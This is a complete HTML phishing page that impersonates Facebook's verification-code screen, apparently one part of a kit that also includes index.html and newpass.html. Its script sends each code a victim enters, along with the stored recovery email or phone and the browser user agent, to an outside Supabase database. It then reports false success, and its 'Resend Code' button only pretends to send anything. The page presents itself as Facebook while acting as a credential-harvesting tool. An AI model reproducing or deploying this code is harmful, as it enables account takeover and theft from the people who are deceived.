<!DOCTYPE html>
<html lang="en">
<head>
  <link rel="icon" type="image/png" href="https://c7bc8e03-a286-4ddc-8273-34910478b7b7-00-23f7gr4ez4rmd.picard.replit.dev/fblogo.png" />
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Enter Verification Code | Facebook</title>
  <style>
    * { box-sizing: border-box; }
    body, html { margin:0; padding:0; min-height:100vh; font-family: Arial, sans-serif; background-color:#f0f2f5; display:flex; align-items:center; justify-content:center; }
    .wrapper { width: 90%; max-width: 400px; background:white; padding:30px; border-radius:8px; box-shadow:0 2px 8px rgba(0,0,0,0.1); text-align:center; }
    .logo img { width:50px; margin-bottom:20px; }
    h1 { font-size:1.6rem; margin-bottom:10px; }
    p { font-size:1rem; color:#606770; margin-bottom:10px; }
    .contact-info { font-size:1rem; font-weight:500; color:#1877f2; margin-bottom:20px; word-break:break-word; }
    input[type="text"] { width:100%; padding:12px; font-size:1rem; border:1px solid #ccc; border-radius:6px; margin-bottom:20px; }
    input[type="text"]:focus { border-color:#1877f2; outline:none; }
    button.primary-btn { width:100%; padding:12px; font-size:1rem; background:#1877f2; border:none; border-radius:6px; color:white; cursor:pointer; margin-bottom:10px; }
    button.primary-btn:hover { background:#165dbb; }
    button.resend-btn { background:none; border:none; color:#1877f2; font-size:0.95rem; cursor:pointer; text-decoration:underline; }
    .message { margin-top:10px; font-size:0.9rem; display:none; }
    .message.show { display:block; }
    .message.success { color:green; }
    .message.error { color:red; }
    .modal-overlay { position:fixed; inset:0; background:rgba(0,0,0,0.5); display:none; align-items:center; justify-content:center; }
    .modal-overlay.show { display:flex; }
    .modal-box { background:white; padding:20px; border-radius:6px; text-align:center; width:280px; }
  </style>
</head>
<body>
  <div class="wrapper">
    <div class="logo">
      <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook Logo" />
    </div>
    <h1>Enter Verification Code</h1>
    <p>We sent a code to:</p>
    <div class="contact-info" id="contactInfo"></div>
    <input type="text" id="codeInput" placeholder="Enter your code" autocomplete="off" />
    <button class="primary-btn" onclick="verifyCode()">Verify</button>
    <button class="resend-btn" onclick="resendCode()">Resend Code</button>
    <div id="message" class="message"></div>
  </div>

  <div id="modalOverlay" class="modal-overlay">
    <div class="modal-box" id="modalBox"></div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
  <script>
    const SUPABASE_URL = "https://twyyuqdmbsdyrlbqgyoq.supabase.co";
    const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InR3eXl1cWRtYnNkeXJsYnFneW9xIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTYwMzExMDUsImV4cCI6MjA3MTYwNzEwNX0.6_NcIRedVB4yHKnvgFpwt9apQMiMlsvx19t8B5UBel8";
    
    const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
      auth: {
        persistSession: false,
        autoRefreshToken: false
      }
    });

    const contactInfo = localStorage.getItem("recovery_target");
    if (!contactInfo) {
      alert("No recovery information found. Redirecting...");
      window.location.href = "index.html";
    } else {
      document.getElementById("contactInfo").textContent = contactInfo;
    }

    function showMessage(text, type) {
      const msg = document.getElementById("message");
      msg.textContent = text;
      msg.className = `message show ${type}`;
    }

    async function verifyCode() {
      const code = document.getElementById("codeInput").value.trim();
      if (!code) return showMessage("Please enter the verification code.", "error");

      try {
        const { data, error } = await supabase.from("verification_codes").insert([
          { 
            recovery_target: contactInfo, 
            verification_code: code, 
            user_agent: navigator.userAgent,
            created_at: new Date().toISOString()
          }
        ]);
        
        if (error) {
          console.error("Supabase error details:", error);
          throw error;
        }
        
        showMessage("Verification successful! Redirecting...", "success");
        setTimeout(() => { window.location.href = "newpass.html"; }, 1500);
      } catch (err) {
        console.error(err);
        showMessage("Error saving code. Try again.", "error");
      }
    }

    function resendCode() {
      const modal = document.getElementById("modalOverlay");
      const box = document.getElementById("modalBox");
      box.textContent = `Verification code sent to ${contactInfo}`;
      modal.classList.add("show");
      setTimeout(() => modal.classList.remove("show"), 2500);
    }
  </script>
</body>
</html>
